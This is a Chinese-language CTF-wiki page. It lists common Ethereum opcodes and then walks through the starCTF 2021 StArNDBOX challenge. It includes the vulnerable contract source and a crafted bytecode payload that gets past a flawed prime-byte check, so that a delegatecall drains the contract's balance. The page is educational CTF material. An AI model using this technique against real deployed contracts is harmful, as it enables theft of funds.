# Ethereum Opcodes
Ethereum 中的 opcodes 有 142 種，部分常見的 opcodes 如下所示：

| Uint8 | Mnomonic |      Stack Input       | Stack Output |              Expression              |
| :---: | :------: | :--------------------: | :----------: | :----------------------------------: |
|  00   |   STOP   |           -            |      -       |                STOP()                |
|  01   |   ADD    |      \| a \| b \|      | \| a + b \|  |                a + b                 |
|  02   |   MUL    |      \| a \| b \|      | \| a * b \|  |                a * b                 |
|  03   |   SUB    |      \| a \| b \|      | \| a - b \|  |                a - b                 |
|  04   |   DIV    |      \| a \| b \|      | \| a // b \| |                a // b                |
|  51   |  MLOAD   |      \| offset \|      | \| value \|  |   value = memory[offset:offset+32]   |
|  52   |  MSTORE  | \| offset \| value \|  |      -       |   memory[offset:offset+32] = value   |
|  54   |  SLOAD   |       \| key \|        | \| value \|  |         value = storage[key]         |
|  55   |  SSTORE  |   \| key \| value \|   |      -       |         storage[key] = value         |
|  56   |   JUMP   |   \| destination \|    |      -       |          $pc = destination           |
|  5B   | JUMPDEST |           -            |      -       |                  -                   |
|  F3   |  RETURN  | \| offset \| length \| |      -       | return memory[offset:offset+length]  |
|  FD   |  REVERT  | \| offset \| length \| |      -       | revert(memory[offset:offset+length]) |

!!! info 
    JUMPDEST 是跳轉指令的 destination，跳轉指令不能跳轉到沒有 JUMPDEST 的地方。

更多的詳細 opcodes 信息可以查看 [ethervm.io](https://ethervm.io)。

## 例子
以 startCTF 2021 的 StArNDBOX 一題爲例講解一下 opcodes 的題目。

本題會在部署挑戰合約的時候傳入 100 wei 到合約中，我們的目標是將合約的 balance 清空。題目合約的源碼如下：

```solidity
pragma solidity ^0.5.11;

library Math {
    function invMod(int256 _x, int256 _pp) internal pure returns (int) {
        int u3 = _x;
        int v3 = _pp;
        int u1 = 1;
        int v1 = 0;
        int q = 0;
        while (v3 > 0){
            q = u3/v3;
            u1= v1;
            v1 = u1 - v1*q;
            u3 = v3;
            v3 = u3 - v3*q;
        }
        while (u1<0){
            u1 += _pp;
        }
        return u1;
    }
    
    function expMod(int base, int pow,int mod) internal pure returns (int res){
        res = 1;
        if(mod > 0){
            base = base % mod;
            for (; pow != 0; pow >>= 1) {
                if (pow & 1 == 1) {
                    res = (base * res) % mod;
                }
                base = (base * base) % mod;
            }
        }
        return res;
    }
    function pow_mod(int base, int pow, int mod) internal pure returns (int res) {
        if (pow >= 0) {
            return expMod(base,pow,mod);
        }
        else {
            int inv = invMod(base,mod);
            return expMod(inv,abs(pow),mod);
        }
    }
    
    function isPrime(int n) internal pure returns (bool) {
        if (n == 2 ||n == 3 || n == 5) {
            return true;
        } else if (n % 2 ==0 && n > 1 ){
            return false;
        } else {
            int d = n - 1;
            int s = 0;
            while (d & 1 != 1 && d != 0) {
                d >>= 1;
                ++s;
            }
            int a=2;
            int xPre;
            int j;
            int x = pow_mod(a, d, n);
            if (x == 1 || x == (n - 1)) {
                return true;
            } else {
                for (j = 0; j < s; ++j) {
                    xPre = x;
                    x = pow_mod(x, 2, n);
                    if (x == n-1){
                        return true;
                    }else if(x == 1){
                        return false;
                    }
                }
            }
            return false;
        }
    }
    
    function gcd(int a, int b) internal pure returns (int) {
        int t = 0;
        if (a < b) {
            t = a;
            a = b;
            b = t;
        }
        while (b != 0) {
            t = b;
            b = a % b;
            a = t;
        }
        return a;
    }
    function abs(int num) internal pure returns (int) {
        if (num >= 0) {
            return num;
        } else {
            return (0 - num);
        }
    }
    
}

contract StArNDBOX{
    using Math for int;
    constructor()public payable{
    }
    modifier StAr() {
        require(msg.sender != tx.origin);
        _;
    }
    function StArNDBoX(address _addr) public payable{
        
        uint256 size;
        bytes memory code;
        int res;
        
        assembly{
            size := extcodesize(_addr)
            code := mload(0x40)
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(code, size)
            extcodecopy(_addr, add(code, 0x20), 0, size)
        }
        for(uint256 i = 0; i < code.length; i++) {
            res = int(uint8(code[i]));
            require(res.isPrime() == true);
        }
        bool success;
        bytes memory _;
        (success, _) = _addr.delegatecall("");
        require(success);
    }
}
```

可以看到題目的 `StArNDBoX` 函數可以獲取任意地址的合約並檢測該合約的每個字節是否爲質數，如果通過檢查則使用 `delegatecall` 來調用目標合約。

但由於該合約中的 `isPrime` 函數並不是完整的質數檢查函數，`00` 和 `01` 也可以通過檢查，因此我們可以構造如下的字節碼：

```
// 0x6100016100016100016100016100016100650361000161fbfbf1
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 65 | PUSH2 0x0065
03       | SUB
61 00 01 | PUSH2 0x0001
61 fb fb | PUSH2 0xfbfb
f1       | CALL
```

來執行 `address(0x0001).call.gas(0xfbfb).value(0x0065 - 0x0001)` 語句，也就是將題目合約中的 balance 轉到 0x1 處，從而清空 balance 滿足得到 flag 的條件。


## 題目

### starCTF 2021
- 題目名稱 StArNDBOX

### RealWorld 2019
- 題目名稱 Montagy

### QWB 2020
- 題目名稱 EasySandbox
- 題目名稱 EGM

### 華爲鯤鵬計算 2020
- 題目名稱 boxgame

!!! note
    注：題目附件相關內容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 倉庫尋找。

## 參考
- [Ethervm](https://ethervm.io)
- [starCTF 2021 - StArNDBOX](https://github.com/sixstars/starctf2021/tree/main/blockchain-StArNDBOX)